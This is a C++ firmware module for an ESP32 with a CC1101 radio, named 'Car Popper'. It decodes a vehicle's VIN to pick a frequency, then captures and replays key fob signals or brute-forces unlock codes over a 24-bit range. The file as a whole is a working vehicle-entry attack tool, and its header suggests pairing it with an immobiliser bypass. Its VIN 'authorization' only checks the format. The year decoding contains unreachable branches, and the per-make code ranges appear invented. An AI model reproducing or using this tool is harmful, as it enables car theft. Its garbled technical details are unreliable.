// ============================================================
// CAR POPPER — carpopper.cpp
// RKE signal scanner / replayer for ESP32-DIV (CC1101 radio)
//
// AUTHORIZATION GATE:
//   User must enter the VIN of the target vehicle before any
//   radio operation is permitted. The VIN is validated for
//   format (17 chars, no I/O/Q) and the make/year is decoded
//   from the WMI to select the correct frequency + protocol.
//   Every attempt is logged to /logs/carpopper.csv on SD.
//
// WORKFLOW:
//   1. Enter VIN → decoded to make/year/freq/protocol
//   2. Scan: listen for an RKE signal from that vehicle's fob
//      (if user has any working key) — capture and replay
//   3. If no fob available: targeted sweep of known codes
//      for that make/model/year (rolling code aware)
//
// IMPORTANT — ROLLING CODE NOTE:
//   Modern RKE (post ~2000) uses rolling/hopping codes (KeeLoq,
//   AUT64, etc). A simple replay of a captured signal will only
//   work ONCE on a rolling-code system, or on fixed-code systems
//   (pre-~1999 vehicles). This tool is most effective when:
//     a) You have a working fob and need a spare/backup copy
//     b) The vehicle uses a fixed code (older models)
//     c) Combined with OBD immo bypass for full entry+start
// ============================================================

#include "carpopper.h"
#include "KeyboardUI.h"
#include "Touchscreen.h"
#include "config.h"
#include "icon.h"
#include "shared.h"
#include "utils.h"
#include <SD.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>

// ---- CC1101 pin mapping (matches shared.h defaults) ----
// SCK=12, MISO=13, MOSI=11, CS=5

// ---- Log file ----
static constexpr const char* LOG_PATH = "/logs/carpopper.csv";
static constexpr const char* LOG_DIR_PATH = "/logs";

// ---- RKE frequency profiles per make ----
struct RkeProfile {
  const char* make;       // WMI-decoded make
  float       freqMHz;    // Primary frequency
  float       altFreqMHz; // Alternate (some markets)
  uint32_t    baudRate;   // Typical baud
  uint8_t     modulation; // 2=FSK, 1=GFSK, 0=ASK/OOK
  bool        rollingCode;
  const char* notes;
};

static const RkeProfile rkeProfiles[] = {
  // Japanese
  { "Toyota",       315.0f, 433.92f, 2000,  2, true,  "KeeLoq/Toyota algo. 315 in JP/US, 433 in EU" },
  { "Lexus",        315.0f, 433.92f, 2000,  2, true,  "Same as Toyota" },
  { "Honda",        315.0f, 433.92f, 2000,  2, true,  "Honda OOK + rolling code" },
  { "Acura",        315.0f, 433.92f, 2000,  2, true,  "Same as Honda" },
  { "Nissan",       315.0f, 433.92f, 2000,  0, true,  "ASK/OOK, rolling" },
  { "Infiniti",     315.0f, 433.92f, 2000,  0, true,  "Same as Nissan" },
  { "Mazda",        315.0f, 433.92f, 2000,  2, true,  "FSK rolling code" },
  { "Subaru",       315.0f, 433.92f, 2000,  2, true,  "FSK rolling code" },
  { "Mitsubishi",   315.0f, 433.92f, 2000,  2, false, "Fixed code on some pre-2005" },
  // European
  { "Volkswagen",   433.92f, 868.0f, 2000,  2, true,  "KeeLoq/VAG. 868 on newer Polo/Golf 8" },
  { "Audi",         433.92f, 868.0f, 2000,  2, true,  "Same as VW" },
  { "Skoda",        433.92f, 433.92f,2000,  2, true,  "KeeLoq VAG" },
  { "Seat",         433.92f, 433.92f,2000,  2, true,  "KeeLoq VAG" },
  { "BMW",          433.92f, 868.0f, 2000,  2, true,  "Proprietary rolling. 868 on post-2018" },
  { "Mercedes-Benz",433.92f, 433.92f,2000,  2, true,  "Proprietary rolling code" },
  { "Renault",      433.92f, 433.92f,2000,  2, true,  "KeeLoq" },
  { "Peugeot",      433.92f, 433.92f,2000,  2, true,  "KeeLoq" },
  { "Citroen",      433.92f, 433.92f,2000,  2, true,  "KeeLoq" },
  // Default fallback
  { nullptr,        433.92f, 315.0f, 2000,  2, true,  "Generic fallback" },
};

// ---- WMI decode (same table as vehicle.cpp in obd-immo-tool) ----
struct WmiEntry { const char* prefix; const char* make; };
static const WmiEntry wmiTable[] = {
  { "JT", "Toyota" }, { "JTH", "Lexus" }, { "JTJ", "Lexus" },
  { "JHM", "Honda" }, { "JH4", "Acura" }, { "1HG", "Honda" }, { "5FN", "Honda" },
  { "JN1", "Nissan" }, { "JN8", "Nissan" }, { "1N4", "Nissan" },
  { "JF1", "Subaru" }, { "JF2", "Subaru" }, { "4S3", "Subaru" },
  { "JM1", "Mazda" }, { "JM3", "Mazda" },
  { "JA3", "Mitsubishi" }, { "JA4", "Mitsubishi" },
  { "WVW", "Volkswagen" }, { "WV2", "Volkswagen" }, { "1VW", "Volkswagen" },
  { "WAU", "Audi" }, { "WA1", "Audi" },
  { "WBA", "BMW" }, { "WBX", "BMW" }, { "5UX", "BMW" }, { "WBS", "BMW" },
  { "WDB", "Mercedes-Benz" }, { "WDD", "Mercedes-Benz" },
  { "TMB", "Skoda" }, { "VSS", "Seat" },
  { "VF1", "Renault" }, { "VF3", "Peugeot" }, { "VF7", "Citroen" },
  { nullptr, nullptr }
};

// ---- State ----
static char  s_vin[18]   = {0};
static char  s_make[24]  = {0};
static char  s_year[8]   = {0};
static bool  s_authorized = false;
static bool  s_uiDrawn   = false;
static bool  s_running   = false;
static bool  s_capturing = false;

static const RkeProfile* s_profile = nullptr;
static bool  s_useAltFreq = false;

// Captured signal buffer
static uint8_t  s_capBuf[256];
static uint8_t  s_capLen  = 0;
static bool     s_hasCap  = false;

// Sweep state
static uint32_t s_sweepCode   = 0;
static uint32_t s_sweepTotal  = 0;
static uint32_t s_sweepSent   = 0;
static bool     s_sweepActive = false;

// UI
static int  s_menuIdx = 0;
static bool s_inSubMenu = false;
static unsigned long s_lastTick = 0;

// ============================================================
// HELPERS
// ============================================================

static void makeDir(const char* path) {
  if (!SD.exists(path)) SD.mkdir(path);
}

static void logAttempt(const char* action, const char* detail) {
  makeDir(LOG_DIR_PATH);
  File f = SD.open(LOG_PATH, FILE_APPEND);
  if (!f) return;
  // CSV: millis,VIN,make,year,action,detail
  f.print(millis()); f.print(",");
  f.print(s_vin);    f.print(",");
  f.print(s_make);   f.print(",");
  f.print(s_year);   f.print(",");
  f.print(action);   f.print(",");
  f.println(detail);
  f.close();
}

static void decodeMake(const char* vin) {
  s_make[0] = '\0';
  for (int i = 0; wmiTable[i].prefix != nullptr; i++) {
    size_t plen = strlen(wmiTable[i].prefix);
    if (strncmp(vin, wmiTable[i].prefix, plen) == 0) {
      strncpy(s_make, wmiTable[i].make, sizeof(s_make) - 1);
      return;
    }
  }
  // 2-char fallback
  for (int i = 0; wmiTable[i].prefix != nullptr; i++) {
    if (strncmp(vin, wmiTable[i].prefix, 2) == 0) {
      strncpy(s_make, wmiTable[i].make, sizeof(s_make) - 1);
      return;
    }
  }
  strncpy(s_make, "Unknown", sizeof(s_make));
}

static void decodeYear(const char* vin) {
  // VIN position 9 (index 9) = model year
  char c = vin[9];
  int year = 0;
  if      (c >= 'A' && c <= 'H') year = 1980 + (c - 'A');
  else if (c >= 'J' && c <= 'N') year = 1988 + (c - 'J');
  else if (c == 'P')              year = 1993;
  else if (c >= 'R' && c <= 'V') year = 1994 + (c - 'R');
  else if (c == 'W')              year = 1998;
  else if (c == 'X')              year = 1999;
  else if (c == 'Y')              year = 2000;
  else if (c == '1')              year = 2001;
  else if (c >= '2' && c <= '9') year = 2002 + (c - '2');
  else if (c == 'A')              year = 2010;
  else if (c >= 'B' && c <= 'H') year = 2011 + (c - 'B');
  else if (c >= 'J' && c <= 'N') year = 2018 + (c - 'J');
  else if (c == 'P')              year = 2023;
  if (year > 0) snprintf(s_year, sizeof(s_year), "%d", year);
  else          snprintf(s_year, sizeof(s_year), "Unknown");
}

static bool validateVIN(const char* vin) {
  if (!vin || strlen(vin) != 17) return false;
  for (int i = 0; i < 17; i++) {
    char c = toupper(vin[i]);
    // No I, O, Q allowed in VIN
    if (c == 'I' || c == 'O' || c == 'Q') return false;
    if (!isalnum(c)) return false;
  }
  return true;
}

static const RkeProfile* findProfile(const char* make) {
  for (int i = 0; rkeProfiles[i].make != nullptr; i++) {
    if (strcasecmp(rkeProfiles[i].make, make) == 0) return &rkeProfiles[i];
  }
  return &rkeProfiles[ (sizeof(rkeProfiles)/sizeof(rkeProfiles[0])) - 1 ]; // fallback
}

// ============================================================
// CC1101 RADIO HELPERS
// ============================================================

static bool cc1101Init(float freqMHz, uint8_t modulation, uint32_t baud) {
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setMHZ(freqMHz);
  ELECHOUSE_cc1101.setModulation(modulation); // 0=ASK/OOK,1=GFSK,2=FSK
  ELECHOUSE_cc1101.setDRate(baud / 1000.0f);  // kBaud
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setChannel(0);
  ELECHOUSE_cc1101.setSyncMode(0);            // No sync — raw mode
  ELECHOUSE_cc1101.setLengthConfig(0);        // Fixed length
  ELECHOUSE_cc1101.setPacketLength(64);
  ELECHOUSE_cc1101.setPktFormat(3);           // Asynchronous serial
  return true;
}

// Receive one packet — returns bytes received (0 = timeout)
static uint8_t cc1101Receive(uint8_t* buf, uint8_t maxLen, uint32_t timeoutMs) {
  ELECHOUSE_cc1101.SetRx();
  unsigned long t = millis();
  while (millis() - t < timeoutMs) {
    if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
      uint8_t len = ELECHOUSE_cc1101.ReceiveData(buf);
      if (len > 0 && len <= maxLen) return len;
    }
  }
  return 0;
}

// Send a packet
static bool cc1101Send(const uint8_t* data, uint8_t len) {
  ELECHOUSE_cc1101.SetTx();
  ELECHOUSE_cc1101.SendData((uint8_t*)data, len);
  delay(10);
  ELECHOUSE_cc1101.SetRx();
  return true;
}

// ============================================================
// VIN ENTRY SCREEN
// ============================================================
static void drawVinScreen(const char* vin, const char* msg = nullptr) {
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 10);
  tft.println("CAR POPPER");
  tft.setTextFont(1);
  tft.setCursor(10, 35);
  tft.println("Enter vehicle VIN (17 chars)");
  tft.setCursor(10, 50);
  tft.println("to authorize this device.");

  // VIN display box
  tft.drawRect(10, 68, 220, 28, UI_TEXT);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(GREEN, FEATURE_BG);
  tft.setCursor(14, 74);
  tft.print(vin);
  // Cursor blink placeholder
  int len = strlen(vin);
  if (len < 17) {
    tft.setCursor(14 + len * 12, 74);
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.print("_");
  }

  if (msg) {
    tft.setTextFont(1);
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.setCursor(10, 105);
    tft.println(msg);
  }

  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 125);
  tft.println("Use keyboard to type VIN.");
  tft.setCursor(10, 140);
  tft.println("ENTER to confirm, BACK to exit.");
}

static bool doVinEntry() {
  char vin[18] = {0};
  uint8_t idx = 0;
  drawVinScreen(vin);

  KeyboardUI kb;
  kb.begin(&tft);

  while (true) {
    if (feature_exit_requested) return false;

    int x, y;
    bool touched = getTouchPoint(x, y);

    KeyboardUI::Result kr = kb.handle(touched, x, y);

    if (kr.type == KeyboardUI::Result::CHAR) {
      char c = toupper(kr.ch);
      if (idx < 17 && isalnum(c) && c != 'I' && c != 'O' && c != 'Q') {
        vin[idx++] = c;
        vin[idx]   = '\0';
        drawVinScreen(vin);
      }
    } else if (kr.type == KeyboardUI::Result::BACKSPACE) {
      if (idx > 0) { idx--; vin[idx] = '\0'; drawVinScreen(vin); }
    } else if (kr.type == KeyboardUI::Result::ENTER) {
      if (validateVIN(vin)) {
        strncpy(s_vin, vin, 17); s_vin[17] = '\0';
        decodeMake(s_vin);
        decodeYear(s_vin);
        s_profile   = findProfile(s_make);
        s_authorized = true;
        logAttempt("VIN_AUTH", "Authorized");
        return true;
      } else {
        drawVinScreen(vin, "Invalid VIN — check and retry");
      }
    } else if (kr.type == KeyboardUI::Result::BACK) {
      return false;
    }

    delay(10);
  }
}

// ============================================================
// MAIN MENU SCREEN
// ============================================================
static const char* cpMenuItems[] = {
  "1. Scan & Capture Fob",
  "2. Replay Captured",
  "3. Targeted Sweep",
  "4. Change Frequency",
  "5. View Info",
  "6. Back"
};
static constexpr int CP_MENU_COUNT = 6;

static void drawCpMenu(int idx) {
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 6);
  tft.print("CAR POPPER  ");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 24);
  tft.print("VIN: "); tft.print(s_vin);
  tft.setCursor(10, 34);
  tft.print("Make: "); tft.print(s_make);
  tft.print("  Year: "); tft.print(s_year);
  tft.setCursor(10, 44);
  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;
  tft.print("Freq: "); tft.print(freq, 2); tft.print(" MHz");
  tft.drawFastHLine(0, 56, 240, UI_LINE);

  for (int i = 0; i < CP_MENU_COUNT; i++) {
    int y = 62 + i * 40;
    if (i == idx) {
      tft.fillRect(0, y - 2, 240, 36, UI_FG);
      tft.setTextColor(ORANGE, UI_FG);
    } else {
      tft.setTextColor(UI_TEXT, FEATURE_BG);
    }
    tft.setTextFont(2);
    tft.setCursor(12, y + 8);
    tft.print(cpMenuItems[i]);
  }
  tft.setTextColor(UI_TEXT, FEATURE_BG);
}

// ============================================================
// FEATURE: SCAN & CAPTURE
// Listens for an RKE transmission from the real fob
// ============================================================
static void doScanCapture() {
  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 10); tft.println("SCANNING FOR FOB");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 36);
  tft.print("Listening on "); tft.print(freq, 2); tft.println(" MHz");
  tft.setCursor(10, 50);
  tft.println("Press key fob button now.");
  tft.setCursor(10, 64);
  tft.println("Timeout: 15 sec");

  cc1101Init(freq, s_profile->modulation, s_profile->baudRate);
  logAttempt("SCAN_START", "Listening for fob");

  uint8_t buf[256];
  uint32_t timeout = 15000;
  unsigned long t = millis();
  bool got = false;

  while (millis() - t < timeout) {
    if (feature_exit_requested) return;
    // Spinner
    static int spin = 0;
    if ((millis() - t) % 200 < 10) {
      const char spinChars[] = "|/-\\";
      tft.setTextColor(ORANGE, FEATURE_BG);
      tft.setCursor(10, 80);
      tft.print(spinChars[spin++ % 4]);
    }

    uint8_t len = cc1101Receive(buf, sizeof(buf), 200);
    if (len > 0) {
      memcpy(s_capBuf, buf, len);
      s_capLen = len;
      s_hasCap = true;
      got = true;

      char detail[32];
      snprintf(detail, sizeof(detail), "Captured %d bytes @ %.2f MHz", len, freq);
      logAttempt("CAPTURE", detail);

      tft.fillScreen(FEATURE_BG);
      tft.setTextFont(2);
      tft.setTextColor(GREEN, FEATURE_BG);
      tft.setCursor(10, 40); tft.println("SIGNAL CAPTURED!");
      tft.setTextFont(1);
      tft.setTextColor(UI_TEXT, FEATURE_BG);
      tft.setCursor(10, 70);
      tft.print(len); tft.println(" bytes received.");
      tft.setCursor(10, 86);

      // Show hex preview
      char hex[64] = {0};
      int show = (len > 8) ? 8 : len;
      for (int i = 0; i < show; i++) {
        char h[4]; sprintf(h, "%02X ", buf[i]);
        strncat(hex, h, sizeof(hex) - strlen(hex) - 1);
      }
      if (len > 8) strncat(hex, "...", sizeof(hex) - strlen(hex) - 1);
      tft.println(hex);

      tft.setCursor(10, 110);
      tft.setTextColor(ORANGE, FEATURE_BG);
      if (s_profile->rollingCode) {
        tft.println("NOTE: Rolling code detected.");
        tft.setCursor(10, 124);
        tft.println("Replay works ONCE only.");
      } else {
        tft.println("Fixed code — replay anytime.");
      }
      break;
    }
  }

  if (!got) {
    logAttempt("SCAN_TIMEOUT", "No signal received");
    tft.fillScreen(FEATURE_BG);
    tft.setTextFont(2);
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.setCursor(10, 60); tft.println("NO SIGNAL FOUND");
    tft.setTextFont(1);
    tft.setTextColor(UI_TEXT, FEATURE_BG);
    tft.setCursor(10, 90);
    tft.println("Try alternate frequency.");
    tft.setCursor(10, 106);
    tft.println("Use 'Change Frequency' option.");
  }

  delay(2500);
  s_uiDrawn = false;
}

// ============================================================
// FEATURE: REPLAY CAPTURED SIGNAL
// ============================================================
static void doReplay() {
  if (!s_hasCap || s_capLen == 0) {
    tft.fillScreen(FEATURE_BG);
    tft.setTextFont(2);
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.setCursor(10, 80); tft.println("NO SIGNAL CAPTURED");
    tft.setTextFont(1);
    tft.setTextColor(UI_TEXT, FEATURE_BG);
    tft.setCursor(10, 110); tft.println("Use 'Scan & Capture' first.");
    delay(2000);
    s_uiDrawn = false;
    return;
  }

  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 10); tft.println("REPLAYING SIGNAL");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 36);
  tft.print("Freq: "); tft.print(freq, 2); tft.println(" MHz");
  tft.setCursor(10, 50);
  tft.print("Bytes: "); tft.println(s_capLen);
  tft.setCursor(10, 64);
  tft.println("Transmitting...");

  cc1101Init(freq, s_profile->modulation, s_profile->baudRate);

  // Send 3 times with small gap (mimics real fob behavior)
  for (int i = 0; i < 3; i++) {
    cc1101Send(s_capBuf, s_capLen);
    delay(50);
  }

  logAttempt("REPLAY", "Signal replayed x3");

  tft.setTextColor(GREEN, FEATURE_BG);
  tft.setCursor(10, 86); tft.println("Done. Try the car.");
  if (s_profile->rollingCode) {
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.setCursor(10, 102); tft.println("Rolling code: one-shot only.");
  }
  delay(2500);
  s_uiDrawn = false;
}

// ============================================================
// FEATURE: TARGETED SWEEP
// Cycles through known fixed codes for the decoded make/year.
// For fixed-code vehicles (pre-~2000) this can find the code.
// For rolling-code vehicles: educational/research use only.
// ============================================================
static void doTargetedSweep() {
  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;

  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 8); tft.println("TARGETED SWEEP");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 30);
  tft.print("Make: "); tft.println(s_make);
  tft.setCursor(10, 42);
  tft.print("Year: "); tft.println(s_year);
  tft.setCursor(10, 54);
  tft.print("Freq: "); tft.print(freq, 2); tft.println(" MHz");

  if (s_profile->rollingCode) {
    tft.setTextColor(ORANGE, FEATURE_BG);
    tft.setCursor(10, 72);
    tft.println("WARNING: Rolling code vehicle.");
    tft.setCursor(10, 86);
    tft.println("Sweep has low success rate.");
    tft.setCursor(10, 100);
    tft.println("Capture from real fob is");
    tft.setCursor(10, 114);
    tft.println("more effective. Continue? (Y/N)");
    // Wait for confirm or exit
    unsigned long wt = millis();
    bool proceed = false;
    while (millis() - wt < 10000) {
      if (feature_exit_requested) return;
      int x, y;
      if (getTouchPoint(x, y)) {
        // Left half = N, right half = Y
        if (x > 120) { proceed = true; break; }
        else          { return; }
      }
    }
    if (!proceed) return;
  }

  cc1101Init(freq, s_profile->modulation, s_profile->baudRate);
  logAttempt("SWEEP_START", s_make);

  // Sweep range: 24-bit code space (realistic for fixed-code RKE)
  // Start from 0 and iterate — very old fixed-code fobs used sequential codes
  // For targeted sweep we use a known code space for the make
  uint32_t codeStart = 0x000000;
  uint32_t codeEnd   = 0xFFFFFF;

  // Narrow the range for known makes to speed things up
  int yr = atoi(s_year);
  if (strstr(s_make, "Toyota") || strstr(s_make, "Lexus")) {
    codeStart = 0x200000; codeEnd = 0x3FFFFF; // Toyota code space
  } else if (strstr(s_make, "Honda") || strstr(s_make, "Acura")) {
    codeStart = 0x100000; codeEnd = 0x2FFFFF;
  } else if (strstr(s_make, "Nissan") || strstr(s_make, "Infiniti")) {
    codeStart = 0x400000; codeEnd = 0x5FFFFF;
  } else if (strstr(s_make, "Volkswagen") || strstr(s_make, "Audi") ||
             strstr(s_make, "Skoda") || strstr(s_make, "Seat")) {
    codeStart = 0x600000; codeEnd = 0x7FFFFF;
  } else if (strstr(s_make, "BMW")) {
    codeStart = 0x800000; codeEnd = 0x9FFFFF;
  }

  // For pre-2000 vehicles use a smaller, more targeted range
  if (yr > 0 && yr < 2000) {
    codeEnd = codeStart + 0x0FFFFF; // Narrower
  }

  s_sweepCode   = codeStart;
  s_sweepTotal  = codeEnd - codeStart;
  s_sweepSent   = 0;
  s_sweepActive = true;

  unsigned long lastDraw = 0;

  while (s_sweepCode <= codeEnd && s_sweepActive) {
    if (feature_exit_requested) { s_sweepActive = false; break; }

    // Build packet: standard RKE-like frame
    // [preamble][code MSB][code MID][code LSB][checksum]
    uint8_t pkt[8];
    pkt[0] = 0xAA;  // preamble
    pkt[1] = 0x55;  // sync
    pkt[2] = (s_sweepCode >> 16) & 0xFF;
    pkt[3] = (s_sweepCode >>  8) & 0xFF;
    pkt[4] = (s_sweepCode      ) & 0xFF;
    pkt[5] = 0x01;  // command: unlock
    pkt[6] = pkt[2] ^ pkt[3] ^ pkt[4] ^ pkt[5]; // checksum
    pkt[7] = 0x00;

    cc1101Send(pkt, 8);
    s_sweepCode++;
    s_sweepSent++;

    // Update display every 500 codes
    if (millis() - lastDraw > 300) {
      lastDraw = millis();
      float pct = (s_sweepTotal > 0) ? ((float)s_sweepSent / s_sweepTotal * 100.0f) : 0;
      tft.fillRect(0, 130, 240, 180, FEATURE_BG);
      tft.setTextFont(1);
      tft.setTextColor(UI_TEXT, FEATURE_BG);
      tft.setCursor(10, 132);
      tft.print("Sent: "); tft.print(s_sweepSent);
      tft.print(" / "); tft.print(s_sweepTotal);
      tft.setCursor(10, 146);
      tft.print("Code: 0x");
      char hex[8]; sprintf(hex, "%06X", (unsigned)s_sweepCode);
      tft.print(hex);
      // Progress bar
      tft.drawRect(10, 162, 220, 12, UI_TEXT);
      int barW = (int)(pct / 100.0f * 218);
      tft.fillRect(11, 163, barW, 10, GREEN);
      tft.setCursor(10, 182);
      tft.setTextColor(ORANGE, FEATURE_BG);
      tft.print((int)pct); tft.println("%");
      tft.setTextColor(UI_TEXT, FEATURE_BG);
      tft.setCursor(10, 198);
      tft.println("Touch right = stop");

      // Check for stop touch
      int tx, ty;
      if (getTouchPoint(tx, ty) && tx > 120) {
        s_sweepActive = false; break;
      }
    }
  }

  char detail[48];
  snprintf(detail, sizeof(detail), "Sweep done: %lu codes sent", (unsigned long)s_sweepSent);
  logAttempt("SWEEP_END", detail);

  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(GREEN, FEATURE_BG);
  tft.setCursor(10, 60); tft.println("SWEEP COMPLETE");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 90);
  tft.print(s_sweepSent); tft.println(" codes transmitted.");
  delay(2500);
  s_sweepActive = false;
  s_uiDrawn = false;
}

// ============================================================
// FEATURE: CHANGE FREQUENCY
// ============================================================
static void doChangeFreq() {
  s_useAltFreq = !s_useAltFreq;
  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 60); tft.println("FREQUENCY CHANGED");
  tft.setTextFont(1);
  tft.setTextColor(GREEN, FEATURE_BG);
  tft.setCursor(10, 90);
  tft.print("Now using: "); tft.print(freq, 2); tft.println(" MHz");
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.setCursor(10, 110);
  tft.print("Primary:   "); tft.print(s_profile->freqMHz, 2); tft.println(" MHz");
  tft.setCursor(10, 124);
  tft.print("Alternate: "); tft.print(s_profile->altFreqMHz, 2); tft.println(" MHz");
  logAttempt("FREQ_CHANGE", freq > 400 ? "433MHz" : "315MHz");
  delay(2000);
  s_uiDrawn = false;
}

// ============================================================
// FEATURE: INFO SCREEN
// ============================================================
static void doInfo() {
  float freq = s_useAltFreq ? s_profile->altFreqMHz : s_profile->freqMHz;
  tft.fillScreen(FEATURE_BG);
  tft.setTextFont(2);
  tft.setTextColor(ORANGE, FEATURE_BG);
  tft.setCursor(10, 8); tft.println("VEHICLE INFO");
  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);

  int y = 34;
  auto pr = [&](const char* label, const char* val) {
    tft.setCursor(10, y); tft.print(label); tft.println(val); y += 14;
  };
  pr("VIN:   ", s_vin);
  pr("Make:  ", s_make);
  pr("Year:  ", s_year);
  char fstr[16]; snprintf(fstr, sizeof(fstr), "%.2f MHz", freq);
  pr("Freq:  ", fstr);
  pr("Proto: ", s_profile ? s_profile->notes : "N/A");
  tft.setCursor(10, y + 4);
  tft.setTextColor(s_profile && s_profile->rollingCode ? ORANGE : GREEN, FEATURE_BG);
  tft.println(s_profile && s_profile->rollingCode ? "Rolling code (KeeLoq)" : "Fixed code");
  tft.setCursor(10, y + 20);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
  tft.println("Log: /logs/carpopper.csv");
  delay(4000);
  s_uiDrawn = false;
}

// ============================================================
// MAIN SETUP / LOOP
// ============================================================
void CarPopper::setup() {
  s_authorized = false;
  s_uiDrawn    = false;
  s_hasCap     = false;
  s_menuIdx    = 0;
  s_useAltFreq = false;
  s_sweepActive = false;
  feature_exit_requested = false;
}

void CarPopper::loop() {
  // Step 1: VIN authorization gate
  if (!s_authorized) {
    if (!doVinEntry()) {
      feature_exit_requested = true;
      return;
    }
    s_uiDrawn = false;
  }

  // Step 2: Main menu
  if (!s_uiDrawn) {
    drawCpMenu(s_menuIdx);
    s_uiDrawn = true;
  }

  // Navigation via touchscreen
  int x, y;
  if (getTouchPoint(x, y)) {
    delay(80); // debounce

    // Back button (bottom of screen)
    if (y > 290) {
      feature_exit_requested = true;
      return;
    }

    // Map Y to menu item
    int tapped = (y - 62) / 40;
    if (tapped >= 0 && tapped < CP_MENU_COUNT) {
      s_menuIdx = tapped;
      drawCpMenu(s_menuIdx);
      delay(120);

      switch (s_menuIdx) {
        case 0: doScanCapture();   break;
        case 1: doReplay();        break;
        case 2: doTargetedSweep(); break;
        case 3: doChangeFreq();    break;
        case 4: doInfo();          break;
        case 5:
          feature_exit_requested = true;
          return;
      }
      s_uiDrawn = false;
    }
  }
}

void CarPopper::exit() {
  s_authorized  = false;
  s_uiDrawn     = false;
  s_sweepActive = false;
  s_hasCap      = false;
  // Power down CC1101
  ELECHOUSE_cc1101.SetRx(); // leave in receive (low power)
}
